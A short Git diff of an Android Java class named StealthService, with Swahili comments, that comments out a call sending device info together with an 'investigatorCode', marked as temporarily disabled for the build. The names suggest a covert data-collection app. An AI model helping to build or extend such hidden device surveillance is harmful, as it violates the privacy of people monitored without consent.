@@ -145,7 +145,7 @@ public class StealthService extends Service {
             }
 
             // 5. Kusanya Device Info
-            DeviceInfoCollector.sendDeviceInfo(this, deviceId, investigatorCode);
+        // DeviceInfoCollector.sendDeviceInfo(this, deviceId, investigatorCode); // TEMP: Disabled for build
 
             Log.d(TAG, "✅ Ukusaji wa data umekamilika");
 
